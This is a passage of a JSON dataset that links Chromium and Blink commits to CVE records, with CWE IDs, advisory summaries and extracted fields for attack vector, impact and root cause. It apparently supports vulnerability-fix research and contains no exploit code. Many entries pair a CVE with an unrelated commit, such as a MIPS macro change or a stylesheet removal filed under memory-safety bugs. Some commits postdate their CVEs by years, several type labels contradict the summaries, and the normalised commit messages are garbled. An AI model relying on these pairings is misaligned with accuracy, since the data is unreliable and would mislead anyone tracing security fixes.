overflow","Attack Vector":"via vectors involving seek operations on video data","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of bounds read when seeking video","Attack Type":"remote attacker"},{"commit_id":"592ca89ecd826dac82b837e5e2085d8c3cfbe22e","cve_id":"CVE-2012-5153","cwe_id":"CWE-119","commit_message":"Revert 164565 - sync: make scheduling logic and job ownership more obvious.\n\nRevert Reason - see bug 158313\n\n- inlines (and removes) SaveJob, to perform only the relevant \"saving\" bits\nwhere needed. As it turns out, most of it was only necessary for ShouldRunJob\n(which I'd like to rename, as it's destructive), and it's a lot easier to read\nwhat's happening and why. Note also removed TODO at SaveJob callsites. \n\n- inlines (and removes) InitOrCoalescePendingJob to perform only the relevant\nbits at each callsite. \n\n- pulls SyncSessionJob into a class, to handle basic responsibilities that need\nthe job Purpose + session (like \"Succeeded()\" and \"Finish\") that were previously\nstrewn about and partially copy\/pasted in the scheduler. \n\n- meticulously transfers ownership (removes linked_ptr usage!) of jobs instead\nof making many implicit struct copies, as it resulted in non-obvious behavior.\nTo do this, ownership is given to the scheduling mechanism (the MessageLoop for\nScheduleSyncSessionJob, WaitInterval::timer for canary jobs), instead of jobs\nsitting around without knowing whether they're scheduled or not. There are a\nfew cases where we can't actually \"schedule\" a job -- which wasn't even obvious\nfrom the old code, and other interesting revelations, like fact that we were \nactually pre-empt nudge canary jobs and \"unscheduling\" them in certain cases.\n\n- removes DoPendingJobIfPossible, since it is no longer needed for \nDoCanaryJob\/Unthrottle cases, and make the behavior more explicit in the other\ncases (mode-switch and SCM error change), see TakePendingJobForCurrentMode. \n\n- removes the ability to create jobs as canary, since this wasn't needed and\nwas adding complexity (see DoCanaryJob \/ GrantCanaryPrivilege). \n\n- removes retry_scheduled as it wasn't used anywhere \n\n- adds lots of comments.\n\nAlso discovered that THROTTLED intervals seem to never fire a canary job with \ntoday's code (broken), config jobs are immune to per-data-type throttling, and\nthe had_nudge allowance was defeated by extra IsBackingOff check in \nScheduleNudgeImpl (see comment on review).\n\nBUG=\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10917234\n\nTBR=tim@chromium.org\nReview URL: https:\/\/codereview.chromium.org\/11347027\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@164780 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google V8 before 3.14.5.3, as used in Google Chrome before 24.0.1312.52, allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted JavaScript code that triggers an out-of-bounds access to stack memory.","commit_message_1":"make scheduling logic and job ownership more obvious","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted javascript code that triggers an out - of - bounds access to stack memory","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an out-of bounds stack access","Attack Type":"remote attacker"},{"commit_id":"935cb0dee7696d70880f96a71bf5687411bb8cb9","cve_id":"CVE-2012-5154","cwe_id":"CWE-189","commit_message":"Fix integer overflow in Windows shared memory handling.\n\nBUG=164490\nReview URL: https:\/\/codereview.chromium.org\/11450016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@171369 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer overflow in Google Chrome before 24.0.1312.52 on Windows allows attackers to cause a denial of service or possibly have unspecified other impact via vectors related to allocation of shared memory.","commit_message_1":"fix integer overflow in window shared memory handling","Vulnerability Type":"integer overflow","Attack Vector":"via vectors related to allocation of shared memory","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"b15c87071f906301bccc824ce013966ca93998c7","cve_id":"CVE-2012-5156","cwe_id":"CWE-399","commit_message":"Validate and report peer's PID to WorkerProcessIpcDelegate so it will be able to duplicate handles to and from the worker process.\n\nAs a side effect WorkerProcessLauncher::Delegate is now responsible for retrieving the client's PID and deciding whether a launch failed due to a permanent error condition.\n\nBUG=134694\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11143025\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@162778 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 24.0.1312.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving PDF fields.","commit_message_1":"validate and report peer 's pid to workerprocessipcdelegate so it will be able to duplicate handle to and from the worker process","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving pdf fields","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"7f0126ff011142c8619b10a6e64d04d1745c503a","cve_id":"CVE-2012-5157","cwe_id":"CWE-119","commit_message":"Revert 162155 \"This review merges the two existing page serializ...\"\n\nChange r162155 broke the world even though it was landed using the CQ.\n\n> This review merges the two existing page serializers, WebPageSerializerImpl and\n> PageSerializer, into one, PageSerializer. In addition to this it moves all\n> the old tests from WebPageNewSerializerTest and WebPageSerializerTest to the\n> PageSerializerTest structure and splits out one test for MHTML into a new\n> MHTMLTest file.\n> \n> Saving as 'Webpage, Complete', 'Webpage, HTML Only' and as MHTML when the\n> 'Save Page as MHTML' flag is enabled now uses the same code, and should thus\n> have the same feature set. Meaning that both modes now should be a bit better.\n> \n> Detailed list of changes:\n> \n> - PageSerializerTest: Prepare for more DTD test\n> - PageSerializerTest: Remove now unneccesary input image test\n> - PageSerializerTest: Remove unused WebPageSerializer\/Impl code\n> - PageSerializerTest: Move data URI morph test\n> - PageSerializerTest: Move data URI test\n> - PageSerializerTest: Move namespace test\n> - PageSerializerTest: Move SVG Image test\n> - MHTMLTest: Move MHTML specific test to own test file\n> - PageSerializerTest: Delete duplicate XML header test\n> - PageSerializerTest: Move blank frame test\n> - PageSerializerTest: Move CSS test\n> - PageSerializerTest: Add frameset\/frame test\n> - PageSerializerTest: Move old iframe test\n> - PageSerializerTest: Move old elements test\n> - Use PageSerizer for saving web pages\n> - PageSerializerTest: Test for rewriting links\n> - PageSerializer: Add rewrite link accumulator\n> - PageSerializer: Serialize images in iframes\/frames src\n> - PageSerializer: XHTML fix for meta tags\n> - PageSerializer: Add presentation CSS\n> - PageSerializer: Rename out parameter\n> \n> BUG=\n> R=abarth@chromium.org\n> \n> Review URL: https:\/\/codereview.chromium.org\/68613003\n\nTBR=tiger@opera.com\n\nReview URL: https:\/\/codereview.chromium.org\/73673003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@162156 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 24.0.1312.52 does not properly handle image data in PDF documents, which allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted document.","commit_message_1":"revert <number> `` this review merges the two existing page serializ","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted document","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle image data","Attack Type":"remote attacker"},{"commit_id":"4d17163f4b66be517dc49019a029e5ddbd45078c","cve_id":"CVE-2013-0828","cwe_id":"CWE-399","commit_message":"Remove the Simple Default Stylesheet, it's just a foot-gun.\n\nWe've been bitten by the Simple Default Stylesheet being out\nof sync with the real html.css twice this week.\n\nThe Simple Default Stylesheet was invented years ago for Mac:\nhttp:\/\/trac.webkit.org\/changeset\/36135\nIt nicely handles the case where you just want to create\na single WebView and parse some simple HTML either without\nstyling said HTML, or only to display a small string, etc.\n\nNote that this optimization\/complexity *only* helps for the\nvery first document, since the default stylesheets are\nall static (process-global) variables.  Since any real page\non the internet uses a tag not covered by the simple default\nstylesheet, not real load benefits from this optimization.\nOnly uses of WebView which were just rendering small bits\nof text might have benefited from this.  about:blank would\nalso have used this sheet.\n\nThis was a common application for some uses of WebView back\nin those days.  These days, even with WebView on Android,\nthere are likely much larger overheads than parsing the\nhtml.css stylesheet, so making it required seems like the\nright tradeoff of code-simplicity for this case.\n\nBUG=319556\n\nReview URL: https:\/\/codereview.chromium.org\/73723005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@162153 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The PDF functionality in Google Chrome before 24.0.1312.52 does not properly perform a cast of an unspecified variable during processing of the root of the structure tree, which allows remote attackers to cause a denial of service or possibly have unknown other impact via a crafted document.","commit_message_1":"remove the simple default stylesheet , it 's just a foot-gun","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted document","Impact":"cause a denial of service or possibly have unknown other impact","Root Cause":"does not properly perform a cast of an unspecified variable during processing of the root of the structure tree","Attack Type":"remote attacker"},{"commit_id":"d123966ec156cd2f92fdada36be39694641b479e","cve_id":"CVE-2013-0829","cwe_id":"CWE-264","commit_message":"File permission fix: now we selectively grant read permission for Sandboxed files\n\nWe also need to check the read permission and call GrantReadFile() for\nsandboxed files for CreateSnapshotFile().\n\nBUG=162114\nTEST=manual\n\nReview URL: https:\/\/codereview.chromium.org\/11280231\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@170181 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.52 does not properly maintain database metadata, which allows remote attackers to bypass intended file-access restrictions via unspecified vectors.","commit_message_1":"now we selectively grant read permission for sandboxed file we also need to check the read permission and call grantreadfile ( ) for sandboxed file for createsnapshotfile ( )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors","Impact":"bypass intended file - access restrictions","Root Cause":"does not properly maintain database metadata","Attack Type":"remote attacker"},{"commit_id":"2e02cfe89cbffc8a0bc1bdaee9efe930fd55e376","cve_id":"CVE-2013-0830","cwe_id":"CWE-20","commit_message":"Verify lfFaceName is NUL terminated in IPC deserializer.\n\nBUG=162066\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11416115\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@168937 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The IPC layer in Google Chrome before 24.0.1312.52 on Windows omits a NUL character required for termination of an unspecified data structure, which has unknown impact and attack vectors.","commit_message_1":"verify lffacename is nul terminated in ipc deserializer","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service","Root Cause":"omits a nul character required for termination of an unspecified data structure","Attack Type":"remote attacker"},{"commit_id":"f7038db6ef172459f14b1b67a5155b8dd210be0f","cve_id":"CVE-2013-0836","cwe_id":"CWE-399","commit_message":"Progressive JPEG outputScanlines() calls should handle failure\n\noutputScanlines() can fail and delete |this|, so any attempt to access\nmembers thereafter should be avoided. Copy the decoder pointer member,\nand use that copy to detect and handle the failure case.\n\nBUG=232763\nR=pkasting@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/14844003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@150545 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google V8 before 3.14.5.3, as used in Google Chrome before 24.0.1312.52, does not properly implement garbage collection, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"progressive jpeg outputscanlines ( ) call should handle failure outputscanlines ( ) can fail and delete |this| , so any attempt to access member thereafter should be avoided","Vulnerability Type":"Resource Management Errors","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly implement garbage collection","Attack Type":"remote attacker"},{"commit_id":"0bd1a6ddb5fb23dfea3e72d60e5e8df4cf5826bc","cve_id":"CVE-2013-0838","cwe_id":"CWE-264","commit_message":"Make shared memory segments writable only by their rightful owners.\n\nBUG=143859\nTEST=Chrome's UI still works on Linux and Chrome OS\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10854242\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@158289 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.52 on Linux uses weak permissions for shared memory segments, which has unspecified impact and attack vectors.","commit_message_1":"make shared memory segment writable only by their rightful owner","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"bypass security restrictions","Root Cause":"uses weak permissions for shared memory segments","Attack Type":"remote attacker"},{"commit_id":"0d77de2f5334b6d560487c5fd696178a3bfc3551","cve_id":"CVE-2014-7905","cwe_id":"CWE-284","commit_message":"Add ThreadChecker for Ozone X11 GPU.\n\nEnsure Ozone X11 tests the same thread constraints we have in Ozone GBM.\n\nBUG=none\n\nReview-Url: https:\/\/codereview.chromium.org\/2366643002\nCr-Commit-Position: refs\/heads\/master@{#421817}","summary":"Google Chrome before 39.0.2171.65 on Android does not prevent navigation to a URL in cases where an intent for the URL lacks CATEGORY_BROWSABLE, which allows remote attackers to bypass intended access restrictions via a crafted web site.","commit_message_1":"add threadchecker for ozone x11 gpu","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted web site","Impact":"bypass intended access restrictions","Root Cause":"does not prevent navigation to a url","Attack Type":"remote attacker"},{"commit_id":"3a2cf7d1376ae33054b878232fb38b8fbed29e31","cve_id":"CVE-2014-7906","cwe_id":"CWE-399","commit_message":"Pepper: Access PepperMediaDeviceManager through a WeakPtr\n\nIts lifetime is scoped to the RenderFrame, and it might go away before the\nhosts that refer to it.\n\nBUG=423030\n\nReview URL: https:\/\/codereview.chromium.org\/653243003\n\nCr-Commit-Position: refs\/heads\/master@{#299897}","summary":"Use-after-free vulnerability in the Pepper plugins in Google Chrome before 39.0.2171.65 allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted Flash content that triggers an attempted PepperMediaDeviceManager access outside of the object's lifetime.","commit_message_1":"access peppermediadevicemanager through a weakptr it lifetime is scoped to the renderframe , and it might go away before the host that refer to it","Vulnerability Type":"use - after - free","Attack Vector":"via crafted flash content that triggers an attempted peppermediadevicemanager access outside of the object ' s lifetime","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within pepper plugins","Attack Type":"remote attacker"},{"commit_id":"b2006ac87cec58363090e7d5e10d5d9e3bbda9f9","cve_id":"CVE-2014-7908","cwe_id":"CWE-189","commit_message":"Add extra checks to avoid integer overflow.\n\nBUG=425980\nTEST=no crash with ASAN\n\nReview URL: https:\/\/codereview.chromium.org\/659743004\n\nCr-Commit-Position: refs\/heads\/master@{#301249}","summary":"Multiple integer overflows in the CheckMov function in media\/base\/container_names.cc in Google Chrome before 39.0.2171.65 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a large atom in (1) MPEG-4 or (2) QuickTime .mov data.","commit_message_1":"add extra check to avoid integer overflow","Vulnerability Type":"multiple integer overflow","Attack Vector":"via a large atom in  mpeg - 4 or quicktime . mov data","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow within media","Attack Type":"remote attacker"},{"commit_id":"2571533bbb5b554ff47205c8ef1513ccc0817c3e","cve_id":"CVE-2014-7909","cwe_id":"CWE-189","commit_message":"DocumentThreadableLoader: Add guards for sync notifyFinished() in setResource()\n\nIn loadRequest(), setResource() can call clear() synchronously:\n  DocumentThreadableLoader::clear()\n  DocumentThreadableLoader::handleError()\n  Resource::didAddClient()\n  RawResource::didAddClient()\nand thus |m_client| can be null while resource() isn't null after setResource(),\ncausing crashes (Issue 595964).\n\nThis CL checks whether |*this| is destructed and\nwhether |m_client| is null after setResource().\n\nBUG=595964\n\nReview-Url: https:\/\/codereview.chromium.org\/1902683002\nCr-Commit-Position: refs\/heads\/master@{#391001}","summary":"effects\/SkDashPathEffect.cpp in Skia, as used in Google Chrome before 39.0.2171.65, computes a hash key using uninitialized integer values, which might allow remote attackers to cause a denial of service by rendering crafted data.","commit_message_1":"add guard for sync notifyfinished ( ) in setresource ( ) in loadrequest ( ) , setresource ( ) can call clear ( ) synchronously : documentthreadableloader : :clear ( ) documentthreadableloader : :handleerror ( ) resource : :didaddclient ( ) rawresource : :didaddclient ( ) and thus |m_client| can be null while resource ( ) is n't null after setresource ( ) , causing crash ( issue <number> )","Vulnerability Type":"Numeric Errors","Attack Vector":"by rendering crafted data","Impact":"cause a denial of service","Root Cause":"caused by an uninitialized memory read","Attack Type":"remote attacker"},{"commit_id":"6d9425ec7badda912555d46ea7abcfab81fdd9b9","cve_id":"CVE-2014-1743","cwe_id":"CWE-399","commit_message":"sync compositor: pass simple gfx types by const ref\n\nSee bug for reasoning\n\nBUG=159273\n\nReview URL: https:\/\/codereview.chromium.org\/1417893006\n\nCr-Commit-Position: refs\/heads\/master@{#356653}","summary":"Use-after-free vulnerability in the StyleElement::removedFromDocument function in core\/dom\/StyleElement.cpp in Blink, as used in Google Chrome before 35.0.1916.114, allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted JavaScript code that triggers tree mutation.","commit_message_1":"pas simple gfx type by const ref see bug for reasoning bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via crafted javascript code that triggers tree mutation","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"63d2b3e07e7487d8b2435d14c4148097fa1b13ca","cve_id":"CVE-2014-1746","cwe_id":"CWE-119","commit_message":"Add MIPS version of YIELD_PROCESSOR in a arch-independent way.\n\nAlso adds CPU(MIPS), CPU(MIPS64) to CPU.h\n\nBUG=564657\n\nReview URL: https:\/\/codereview.chromium.org\/1501533004\n\nCr-Commit-Position: refs\/heads\/master@{#364065}","summary":"The InMemoryUrlProtocol::Read function in media\/filters\/in_memory_url_protocol.cc in Google Chrome before 35.0.1916.114 relies on an insufficiently large integer data type, which allows remote attackers to cause a denial of service (out-of-bounds read) via vectors that trigger use of a large buffer.","commit_message_1":"add mips version of yield_processor in a arch-independent way","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger use of a large buffer","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"1924f747637265f563892b8f56a64391f6208194","cve_id":"CVE-2014-1747","cwe_id":"CWE-79","commit_message":"Allow the cast tray to function as expected when the installed extension is missing API methods.\n\nBUG=489445\n\nReview URL: https:\/\/codereview.chromium.org\/1145833003\n\nCr-Commit-Position: refs\/heads\/master@{#330663}","summary":"Cross-site scripting (XSS) vulnerability in the DocumentLoader::maybeCreateArchive function in core\/loader\/DocumentLoader.cpp in Blink, as used in Google Chrome before 35.0.1916.114, allows remote attackers to inject arbitrary web script or HTML via crafted MHTML content, aka *Universal XSS (UXSS).*","commit_message_1":"allow the cast tray to function a expected when the installed extension is missing api method","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via crafted mhtml content , aka * universal xss ( uxss )","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input when handling local MHTML files","Attack Type":"remote attacker"},{"commit_id":"2327c7044eeabc2e70700ff7f752e4b2e2978657","cve_id":"CVE-2014-1748","cwe_id":null,"commit_message":"Do not attempt to open a channel to a plugin in Plugin Data Remover if there are no plugins available.\n\nBUG=485886\n\nReview URL: https:\/\/codereview.chromium.org\/1144353003\n\nCr-Commit-Position: refs\/heads\/master@{#331168}","summary":"The ScrollView::paint function in platform\/scroll\/ScrollView.cpp in Blink, as used in Google Chrome before 35.0.1916.114, allows remote attackers to spoof the UI by extending scrollbar painting into the parent frame.","commit_message_1":"do not attempt to open a channel to a plugin in plugin data remover if there are no plugins available","Vulnerability Type":"unspecified","Attack Vector":"by extending scrollbar painting into the parent frame","Impact":"spoof the ui","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4a3e17c874bc4c4c90e5b0f8ec568520964695d4","cve_id":"CVE-2014-1749","cwe_id":null,"commit_message":"Notification actions may have an icon url.\n\nThis is behind a runtime flag for two reasons:\n* The implementation is incomplete.\n* We're still evaluating the API design.\n\nIntent to Implement and Ship: Notification Action Icons\nhttps:\/\/groups.google.com\/a\/chromium.org\/d\/msg\/blink-dev\/IM0HxOP7HOA\/y8tu6iq1CgAJ\n\nBUG=581336\n\nReview URL: https:\/\/codereview.chromium.org\/1644573002\n\nCr-Commit-Position: refs\/heads\/master@{#374649}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 35.0.1916.114 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"notification action may have an icon url","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"1a2fd6cd9275d2fdd909c2f867ae57744bfa4e49","cve_id":"CVE-2014-3189","cwe_id":"CWE-264","commit_message":"Remove base\/move.h\n\nIt's the same thing as DISALLOW_COPY_AND_ASSIGN now anyway.\n\nBUG=566182\n\nCommitted: https:\/\/crrev.com\/bb5161ab7ad524a9bced788f8099e786946f3a44\nReview-Url: https:\/\/codereview.chromium.org\/2038273002\nCr-Original-Commit-Position: refs\/heads\/master@{#398237}\nCr-Commit-Position: refs\/heads\/master@{#398384}","summary":"The chrome_pdf::CopyImage function in pdf\/draw_utils.cc in the PDFium component in Google Chrome before 38.0.2125.101 does not properly validate image-data dimensions, which allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"remove base\/<file> it 's the same thing a disallow_copy_and_assign now anyway","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( out - of - bounds read ) or possibly have unspecified other impact","Root Cause":"does not properly validate image - data dimensions ,","Attack Type":"remote attacker"},{"commit_id":"11a4cc4a6d6e665d9a118fada4b7c658d6f70d95","cve_id":"CVE-2014-3191","cwe_id":"CWE-416","commit_message":"Defer call to updateWidgetPositions() outside of RenderLayerScrollableArea.\n\nupdateWidgetPositions() can destroy the render tree, so it should never\nbe called from inside RenderLayerScrollableArea. Leaving it there allows\nfor the potential of use-after-free bugs.\n\nBUG=402407\nR=vollick@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/490473003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@180681 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Blink, as used in Google Chrome before 38.0.2125.101, allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted JavaScript code that triggers a widget-position update that improperly interacts with the render tree, related to the FrameView::updateLayoutAndStyleForPainting function in core\/frame\/FrameView.cpp and the RenderLayerScrollableArea::setScrollOffset function in core\/rendering\/RenderLayerScrollableArea.cpp.","commit_message_1":"defer call to updatewidgetpositions ( ) outside of renderlayerscrollablearea","Vulnerability Type":"Use After Free","Attack Vector":"via crafted javascript code that triggers a widget - position update that improperly interacts with the render tree , related to the frameview : : updatelayoutandstyleforpainting function in core \/ frame \/ frameview . cpp and the renderlayerscrollableare","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Rendering","Attack Type":"remote attacker"},{"commit_id":"05c619eb6e7dac046afc72c0d5381856f87fb421","cve_id":"CVE-2014-3194","cwe_id":"CWE-416","commit_message":"exo: Reduce side-effects of dynamic activation code.\n\nThis code exists for clients that need to managed their own system\nmodal dialogs. Since the addition of the remote surface API we\ncan limit the impact of this to surfaces created for system modal\ncontainer.\n\nBUG=29528396\n\nReview-Url: https:\/\/codereview.chromium.org\/2084023003\nCr-Commit-Position: refs\/heads\/master@{#401115}","summary":"Use-after-free vulnerability in the Web Workers implementation in Google Chrome before 38.0.2125.101 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"reduce side-effects of dynamic activation code","Vulnerability Type":"Use After Free","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within Web Workers","Attack Type":"remote attacker"},{"commit_id":"9b04ffd8e7a07e9b2947fe5b71acf85dff38a63f","cve_id":"CVE-2014-3198","cwe_id":"CWE-119","commit_message":"Let PDFium handle event when there is not yet a visible page.\n\nSpeculative fix for 415307. CF will confirm.\nThe stack trace for that bug indicates an attempt to index by -1, which is consistent with no visible page.\n\nBUG=415307\n\nReview URL: https:\/\/codereview.chromium.org\/560133004\n\nCr-Commit-Position: refs\/heads\/master@{#295421}","summary":"The Instance::HandleInputEvent function in pdf\/instance.cc in the PDFium component in Google Chrome before 38.0.2125.101 interprets a certain -1 value as an index instead of a no-visible-page error code, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"let pdfium handle event when there is not yet a visible page","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"d800220da9f744779f1989e2092c88770adcd20a","cve_id":"CVE-2014-3179","cwe_id":null,"commit_message":"Remove blink::ReadableStream\n\nThis CL removes two stable runtime enabled flags\n - ResponseConstructedWithReadableStream\n - ResponseBodyWithV8ExtraStream\nand related code including blink::ReadableStream.\n\nBUG=613435\n\nReview-Url: https:\/\/codereview.chromium.org\/2227403002\nCr-Commit-Position: refs\/heads\/master@{#411014}","summary":"Multiple unspecified vulnerabilities in Google Chrome before 37.0.2062.120 allow attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"this cl remove two stable runtime enabled flag - responseconstructedwithreadablestream - responsebodywithv8extrastream and related code including blink : :readablestream","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"related to various fixes from internal audits","Attack Type":"remote attacker"},{"commit_id":"2f663de43634c1197a7a2ed8afc12cb6dc565bd0","cve_id":"CVE-2014-3176","cwe_id":"CWE-94","commit_message":"ozone: fix crash when running video decode unittests.\n\nIn GLSurfaceOzoneSurfacelessSurfaceImpl::Destroy, if the previous\ncontext was NULL, do not make it current.\n\nBUG=chromium:602921\nTEST=Run vda unittests on oak.\n\nReview URL: https:\/\/codereview.chromium.org\/1887563002\n\nCr-Commit-Position: refs\/heads\/master@{#386988}","summary":"Google Chrome before 37.0.2062.94 does not properly handle the interaction of extensions, IPC, the sync API, and Google V8, which allows remote attackers to execute arbitrary code via unspecified vectors, a different vulnerability than CVE-2014-3177.","commit_message_1":"fix crash when running video decode unittests","Vulnerability Type":"Code Injection","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary code","Root Cause":"An unspecified error","Attack Type":"remote attacker"},{"commit_id":"f592cf6a66b63decc7e7093b36501229a5de1f1d","cve_id":"CVE-2014-3168","cwe_id":null,"commit_message":"SVG: Moving animating <svg> to other iframe should not crash.\n\nMoving SVGSVGElement with its SMILTimeContainer already started caused crash before this patch.\n|SVGDocumentExtentions::startAnimations()| calls begin() against all SMILTimeContainers in the document, but the SMILTimeContainer for <svg> moved from other document may be already started.\n\nBUG=369860\n\nReview URL: https:\/\/codereview.chromium.org\/290353002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@174338 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the SVG implementation in Blink, as used in Google Chrome before 37.0.2062.94, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper caching associated with animation.","commit_message_1":"moving animating < svg > to other iframe should not crash","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper caching associated with animation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within SVG","Attack Type":"remote attacker"},{"commit_id":"80d5aa4a1de9107d1442480b8ea9ba06feff2be2","cve_id":"CVE-2014-3170","cwe_id":"CWE-264","commit_message":"Don't allow null bytes in hosts of host permissions.\n\nBUG=390624\nTEST=Load the sample manifest from the bug, comment #9. It should fail to load.\n\nReview URL: https:\/\/codereview.chromium.org\/416263002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@285492 0039d316-1c4b-4281-b951-d872f2087c98","summary":"extensions\/common\/url_pattern.cc in Google Chrome before 37.0.2062.94 does not prevent use of a '0' character in a host name, which allows remote attackers to spoof the extension permission dialog by relying on truncation after this character.","commit_message_1":"do n't allow null byte in host of host permission","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by relying on truncation after this character","Impact":"spoof the extension permission dialog","Root Cause":"does not prevent use of a ' 0 ' character","Attack Type":"remote attacker"},{"commit_id":"d10a8dac48d3a9467e81c62cb45208344f4542db","cve_id":"CVE-2014-3171","cwe_id":null,"commit_message":"Replace further questionable HashMap::add usages in bindings\n\nBUG=390928\nR=dcarney@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/411273002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@178823 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the V8 bindings in Blink, as used in Google Chrome before 37.0.2062.94, allows remote attackers to cause a denial of service or possibly have unspecified other impact by leveraging improper use of HashMap add operations instead of HashMap set operations, related to bindings\/core\/v8\/DOMWrapperMap.h and bindings\/core\/v8\/SerializedScriptValue.cpp.","commit_message_1":"usage in binding bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"by leveraging improper use of hashmap add operations instead of hashmap set operations , related to bindings \/ core \/ v8 \/ domwrappermap . h and bindings \/ core \/ v8 \/ serializedscriptvalue . cpp","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within bindings","Attack Type":"remote attacker"},{"commit_id":"684a212a93141908bcc10f4bc57f3edb53d2d21f","cve_id":"CVE-2014-3172","cwe_id":"CWE-264","commit_message":"Have the Debugger extension api check that it has access to the tab\n\nCheck PermissionsData::CanAccessTab() prior to attaching the debugger.\n\nBUG=367567\n\nReview URL: https:\/\/codereview.chromium.org\/352523003\n\ngit-svn-id: 